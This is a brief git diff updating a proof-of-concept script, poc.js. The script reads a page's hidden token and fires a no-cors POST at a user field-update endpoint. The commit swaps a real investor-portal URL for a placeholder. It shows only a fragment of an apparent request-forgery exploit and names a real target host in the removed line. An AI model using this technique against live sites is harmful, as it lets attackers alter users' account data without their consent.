8ff94bd9695ecb3c3054b40422c60a389eb8ee10
ret2eax <magicsbro@gmail.com>
2021-03-02 17:45:25 +0800

    Update poc.js

--- poc.js
+++ poc.js
@@ -2,7 +2,7 @@
       const extract = document.querySelector('input[name="_token"]').value;
 
       try {
-        const request = await fetch('https://investorportal.ispt.net.au/user/updateField/1559', {
+        const request = await fetch('somewhere-1559', {
               method: 'POST',
               cache: 'no-cache',
               mode: 'no-cors',
